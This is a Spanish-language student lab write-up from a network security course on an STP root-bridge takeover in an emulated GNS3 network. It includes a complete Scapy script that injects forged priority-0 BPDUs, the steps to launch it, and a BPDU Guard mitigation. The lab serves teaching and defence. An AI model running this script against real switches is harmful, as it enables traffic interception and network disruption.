# 🛡️Security Audit: Spanning Tree Protocol (STP) Manipulation

<p align="center">
  <img src="https://img.shields.io/badge/Platform-GNS3-blue?style=for-the-badge&logo=virtualbox&logoColor=white" alt="GNS3 Platform">
  <img src="https://img.shields.io/badge/Language-Python%203-3776AB?style=for-the-badge&logo=python&logoColor=white" alt="Python 3">
  <img src="https://img.shields.io/badge/Library-Scapy-red?style=for-the-badge&logo=scapy&logoColor=white" alt="Scapy">
  <img src="https://img.shields.io/badge/Status-Mitigated-success?style=for-the-badge" alt="Status Mitigated">
</p>

---

## 📝 Información del Estudiante
* **Institución:** Instituto Tecnológico de Las Américas (ITLA)
* **Asignatura:** Seguridad de Redes
* **Auditor Técnico:** Zoe Daniela Bobonagua Acevedo
* **Matrícula:** 2025-0839
* **Evidencia Audiovisual:** [▶️ Video aqui ](https://youtu.be/1pnQr2TPLQg)

---

## 🎯 1. Objetivo del Laboratorio
El propósito fundamental de esta auditoría es evaluar de manera controlada la robustez estructural del protocolo Spanning Tree (IEEE 802.1D) dentro de una red local conmutada Cisco. La práctica busca demostrar el impacto operacional cuando un dispositivo no autorizado suplanta la identidad jerárquica de la red y validar los mecanismos de contención perimetral (*Hardening*) necesarios para neutralizar la vulnerabilidad en entornos corporativos.

---

## 📐 2. Arquitectura de la Red Emulada

La infraestructura física y lógica fue replicada en **GNS3** siguiendo fielmente el esquema adjunto en el proyecto, operando bajo el segmento IP personalizado `10.25.83.0/24`.

### Diagrama de Flujo Lógico
```text
                      +-----------------------+
                      |    R1 (Cisco IOSv)    |
                      |   Gateway & DHCP Srv  |
                      +-----------------------+
                                  | f0/0
                                  |
                                  | Gi0/1
                      +-----------------------+
                      |  SW1 (Cisco IOSv-L2)  |
                      |   Core / STP Root     |
                      +-----------------------+
                                  | Gi0/2
                                  |
                                  | Gi0/2
                      +-----------------------+
                      |  SW2 (Cisco IOSv-L2)  |
                      |     Access Switch     |
                      +-----------------------+
                         | Gi0/3           | Gi1/0
                         |                 |
                         | e0              | e0
          +--------------------+     +--------------------+
          |    kali-1 (VM)     |     |     PC1 (VPCS)     |
          |  Auditor Estático  |     |   Cliente Dinámico |
          +--------------------+     +--------------------+

```

### Cuadro de Direccionamiento e Interfaces

| Dispositivo | Interfaz Física | Tipo de Enlace | Dirección IP | Máscara de Red | Default Gateway | Segmento VLAN |
| --- | --- | --- | --- | --- | --- | --- |
| **R1** | `f0/0.83` | Subinterfaz | 10.25.83.1 | 255.255.255.0 | N/A | VLAN 83 (Data) |
| **R1** | `f0/0.99` | Subinterfaz | 10.25.99.1 | 255.255.255.0 | N/A | VLAN 99 (Nativa) |
| **SW1** | `Vlan99` | Virtual SVI | 10.25.99.11 | 255.255.255.0 | 10.25.99.1 | VLAN 99 (Gestión) |
| **SW2** | `Vlan99` | Virtual SVI | 10.25.99.12 | 255.255.255.0 | 10.25.99.1 | VLAN 99 (Gestión) |
| **kali-1** | `eth0` | Acceso Estático | 10.25.83.99 | 255.255.255.0 | 10.25.83.1 | VLAN 83 (Data) |
| **PC1** | `e0` | Acceso Dinámico | Asignada DHCP | 255.255.255.0 | 10.25.83.1 | VLAN 83 (Data) |

---

## 💻 3. Documentación Técnica del Script (`stp_root.py`)

### Análisis Operativo del Código

El script desarrollado interactúa a bajo nivel con la tarjeta de red utilizando **Scapy**. Su función es encapsular tramas de datos de control de puente de configuración (**BPDUs**) e inyectarlas cíclicamente a la red para forzar una reconfiguración estructural del árbol de expansión.

### Requisitos y Dependencias

* **OS Emisor:** Kali Linux (o distribuciones con soporte de inyección de sockets crudos).
* **Entorno:** Python 3.x de 64 bits.
* **Librería de manipulación:** Scapy (`pip install scapy` o `sudo apt install python3-scapy`).
* **Ejecución:** Requiere elevación de privilegios de administrador (`sudo`).

### Variables y Parámetros Estructurados

* `iface`: Tarjeta de red física asignada al host de auditoría (`"eth0"`).
* `stp_dst`: Dirección física multicast estándar del protocolo STP (`01:80:c2:00:00:00`).
* `rootid` / `bridgeid`: Forzado lógico a `0` para declarar la prioridad máxima sobre la red.

### Código de la Herramienta

```python
#!/usr/bin/env python3
from scapy.all import *
import time
import sys

print("[*] Iniciando inyección de tramas de control BPDU...")

# Dirección de destino multicast estándar de Spanning Tree
stp_dst = "01:80:c2:00:00:00"

# Construcción manual de la trama apilando capas mediante Scapy
pkt = (Ether(dst=stp_dst, src="00:11:22:33:44:55")/
       STP(rootid=0, rootmac="00:11:22:33:44:55", bridgeid=0, bridgemac="00:11:22:33:44:55"))

try:
    while True:
        sendp(pkt, iface="eth0", verbose=False)
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Auditoría detenida por el operador.")
    sys.exit(0)

```

---

## 🚀 4. Guía de Ejecución y Diagnóstico de Anomalías

### Paso 1: Comprobar el estado original (Línea Base Segura)

Antes de ejecutar el script, verifique desde la consola del Switch de Acceso (**SW2**) que la raíz lógica esté correctamente apuntada hacia el Core Switch de la red:

```vty
SW2# show spanning-tree vlan 83

```

### Paso 2: Lanzamiento de la herramienta

Desde la terminal de Kali Linux, asigne los permisos necesarios y ejecute la herramienta con privilegios elevados:

```bash
chmod +x stp_root.py
sudo python3 stp_root.py

```

### Paso 3: Evidencia del Impacto Operativo

Regrese a la interfaz de **SW2** y verifique cómo el árbol ha migrado su raíz lógica hacia el puerto no autorizado `Gi0/3` controlado por Kali:

```vty
SW2# show spanning-tree vlan 83

```

---

## 🛠️ 5. Plan de Mitigación e Ingeniería de Hardening

> [!IMPORTANT]
> Los puertos de cara al usuario final (Edge Ports) jamás deben procesar tramas de control jerárquicas de Spanning Tree.

### Configuración Defensiva (Copiar y pegar en SW2)

Para inmunizar la topología frente a este vector de ataque, aplique la directiva **BPDU Guard** de manera granular en las interfaces de acceso del Switch perimetral:

```vty
configure terminal
interface range GigabitEthernet0/3 , GigabitEthernet1/0
 description DEFENSE_PUERTOS_DE_ACCESO
 spanning-tree bpduguard enable
end

```

### Comprobación de la Eficiencia de la Defensa

Al intentar ejecutar el script de Scapy nuevamente con la mitigación activa, el switch detectará la trama anómala e inmediatamente aplicará un bloqueo administrativo total sobre el puerto del atacante para mitigar el riesgo:

```vty
SW2# show interfaces status err-disabled

```

*La interfaz `Gi0/3` pasará inmediatamente al estado operacional de `err-disabled`, protegiendo la topología intacta de la organización.*

---

## ⚖️ 6. Aviso de Uso Académico

Este proyecto se ha desarrollado bajo un enfoque estrictamente académico para dar cumplimiento a la Práctica N°1 de la materia de Seguridad de Redes de la carrera de Seguridad Informática. Toda la información y código expuesto se ha ejecutado dentro de un laboratorio aislado bajo la emulación controlada de GNS3.

